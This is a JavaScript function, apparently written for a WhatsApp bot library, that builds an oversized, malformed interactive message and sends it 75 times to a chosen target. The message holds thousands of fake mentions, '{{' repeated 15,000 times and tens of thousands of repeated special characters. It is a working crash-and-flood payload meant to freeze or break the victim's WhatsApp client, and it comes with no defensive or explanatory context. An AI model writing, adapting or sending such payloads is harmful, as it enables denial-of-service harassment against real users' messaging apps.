async function ForcexUi(sock, target) {
  const ZieeMsg = [
    "0@s.whatsapp.net",
    "13135550002@s.whatsapp.net",
    ...Array.from({ length: 5000 }, () =>
      "1" + Math.floor(Math.random() * 999999) + "@s.whatsapp.net"
    ),
  ];

  for (let i = 0; i < 75; i++) {
    const mediaFlood = {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: {
              text: "Z1ee - Tryhards ¿?",
            },
            contextInfo: {
              forwardingScore: 9999,
              isForwarded: true,
              participant: "0@s.whatsapp.net",
              remoteJid: "status@broadcast",
              mentionedJid: ZieeMsg,
              ephemeralSettingTimestamp: 9741,
              entryPointConversionSource: "WhatsApp.com",
              entryPointConversionApp: "WhatsApp",
              disappearingMode: {
                initiator: "INITIATED_BY_OTHER",
                trigger: "ACCOUNT_SETTING",
              },
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: "",
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: JSON.stringify({ status: true }),
                },
              ],
              messageParamsJson: "{{".repeat(15000),
            },
          },
          extendedTextMessage: {
            text: "ꦾ".repeat(25000) + "@1".repeat(25000),
            contextInfo: {
              stanzaId: target,
              participant: target,
              quotedMessage: {
                conversation:
                  "Z1ee - Tryhards ¿?" +
                  "ꦾ࣯࣯".repeat(60000) +
                  "@1".repeat(30000),
              },
              disappearingMode: {
                initiator: "CHANGED_IN_CHAT",
                trigger: "CHAT_SETTING",
              },
            },
            inviteLinkGroupTypeV2: "DEFAULT",
          },
        },
      },
    };

    try {
      const msg = generateWAMessageFromContent(target, mediaFlood, {});
      await sock.relayMessage(target, msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
      });
    } catch (err) {
    }
  }
}